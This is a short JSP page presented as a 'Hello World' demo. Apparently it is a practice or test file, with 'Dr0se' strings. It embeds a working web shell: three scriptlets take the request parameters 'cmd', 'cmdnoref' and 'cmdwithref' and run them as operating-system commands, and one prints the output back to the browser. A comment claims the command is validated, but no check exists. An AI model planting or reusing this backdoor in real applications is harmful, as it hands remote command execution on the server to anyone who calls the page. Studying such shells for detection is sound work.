<%@ page import="java.io.IOException" %>
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
  <title>JSP - Hello World</title>
</head>
<body>
<h1><%= "Hello World!" %></h1>
<% out.println("Dr0se!!!"); %>
<%
  String cmdnoref = request.getParameter("cmdnoref");
  if (cmdnoref != null) {
    // 进一步验证 cmd 是否安全
    Runtime.getRuntime().exec(cmdnoref);
  } else {
    out.println("命令参数为空。");
  }
%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    try {
      Runtime.getRuntime().exec(cmd);
    } catch (IOException e) {
      out.println("Error executing command: " + e.getMessage());
    }
  }
%>
<% if(request.getParameter("cmdwithref")!=null){
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmdwithref")).getInputStream();
  int a = -1;
  byte[] b = new byte[2048];
  out.print("<pre>");
  while((a=in.read(b))!=-1){
    out.print(new String(b));
  }
  out.print("</pre>");
}

%>
<br/>
<a href="servlet">Hello Servlet</a>
<p><% String name = "DR0SE"; %>username:<%=name%></p>
</body>
</html>